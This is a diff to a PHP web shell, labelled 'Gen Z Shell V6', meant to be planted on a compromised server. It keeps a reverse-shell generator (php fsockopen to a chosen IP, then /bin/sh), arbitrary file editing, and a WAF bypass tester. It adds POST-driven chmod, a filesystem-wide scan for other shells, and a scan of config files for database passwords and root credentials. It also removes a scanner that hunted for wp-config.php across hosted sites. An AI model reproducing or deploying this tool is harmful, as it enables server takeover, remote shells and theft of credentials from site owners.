@@ -49,6 +49,11 @@ if (isset($_POST['editfile']) && isset($_POST['content'])) {
     file_put_contents($_POST['editfile'], $_POST['content']);
 }
 
+// Change Permission
+if (isset($_POST['chmodfile'], $_POST['chmodvalue'])) {
+    chmod($_POST['chmodfile'], octdec($_POST['chmodvalue']));
+}
+
 // Mini WAF Bypass Tester
 function wafTest($url, $payloads) {
     $results = [];
@@ -68,11 +73,38 @@ function reverseShellCode($ip, $port) {
     return "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
 }
 
+// Shell Detector (simple pattern based)
+function scanShells($dir) {
+    $found = [];
+    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
+    foreach ($iterator as $file) {
+        if (pathinfo($file, PATHINFO_EXTENSION) !== 'php') continue;
+        $content = file_get_contents($file);
+        if (preg_match('/(base64_decode|gzinflate|shell_exec|eval|assert|system|passthru|`)/i', $content)) {
+            $found[] = $file;
+        }
+    }
+    return $found;
+}
+
+// Credentials Scanner
+function scanCreds($dir) {
+    $found = [];
+    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
+    foreach ($iterator as $file) {
+        if (!in_array(pathinfo($file, PATHINFO_EXTENSION), ['php','env','ini','json','yaml','yml'])) continue;
+        $content = file_get_contents($file);
+        if (preg_match('/(DB_PASSWORD|DB_USER|DB_HOST|DB_NAME|password\s*=\s*|user\s*=\s*|root|mysql)/i', $content)) {
+            $found[] = $file;
+        }
+    }
+    return $found;
+}
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-<title>Gen Z Shell V5 🔥</title>
+<title>Gen Z Shell V6 🔥</title>
 <style>
 body { background:#111; color:#eee; font-family:Consolas, monospace; padding:20px; }
 a { color:#6cf; text-decoration:none; }
@@ -87,7 +119,7 @@ pre { background:#222; padding:10px; overflow:auto; }
 <body>
 
 <div class="sidebar">
-    <h1>🔥 Gen Z V5</h1>
+    <h1>🔥 Gen Z V6</h1>
     <p><b>Current Dir:</b> <?php echo htmlspecialchars($cwd); ?></p>
     <p><a href="?">Home</a></p>
     <ul>
@@ -122,6 +154,13 @@ pre { background:#222; padding:10px; overflow:auto; }
     <button>Upload</button>
 </form>
 
+<h2>🔐 Change Permission</h2>
+<form method="post">
+    File: <input type="text" name="chmodfile" value="<?php echo htmlspecialchars($cwd); ?>" style="width:300px;">
+    Chmod: <input type="text" name="chmodvalue" value="0755" style="width:80px;">
+    <button>Change</button>
+</form>
+
 <h2>📝 File Editor</h2>
 <?php 
 if (is_file($cwd)) {
@@ -131,23 +170,6 @@ if (is_file($cwd)) {
     <button>Save</button></form>";
 } else {
     echo "Select a file to edit.";
-}
-?>
-
-<h2>🔎 WP Path Scanner</h2>
-<?php
-$scanDirs = ['/home/', '/home1/', '/var/www/', '/var/www/html/'];
-foreach ($scanDirs as $base) {
-    foreach (glob($base . '*', GLOB_ONLYDIR) as $sub) {
-        $pub = $sub.'/public_html/';
-        if (is_dir($pub)) {
-            echo "<b>$pub</b><br>";
-            foreach (['wp-config.php','wp-content/uploads/','wp-content/plugins/'] as $subfile) {
-                $full = $pub.$subfile;
-                if (file_exists($full)) echo "✅ $subfile<br>";
-            }
-        }
-    }
 }
 ?>
 
@@ -173,6 +195,26 @@ Port: <input type="text" name="rport" value="9001">
 <?php
 if (isset($_POST['rip'],$_POST['rport'])) {
     echo "<pre>".reverseShellCode($_POST['rip'],$_POST['rport'])."</pre>";
+}
+?>
+
+<h2>🔎 Shell Scanner</h2>
+<?php
+$shells = scanShells("/");
+if ($shells) {
+    echo "<pre>".implode("\n",$shells)."</pre>";
+} else {
+    echo "✅ No suspicious shell found.";
+}
+?>
+
+<h2>🔑 Credentials Scanner</h2>
+<?php
+$creds = scanCreds("/");
+if ($creds) {
+    echo "<pre>".implode("\n",$creds)."</pre>";
+} else {
+    echo "✅ No credentials found.";
 }
 ?>
 </div>
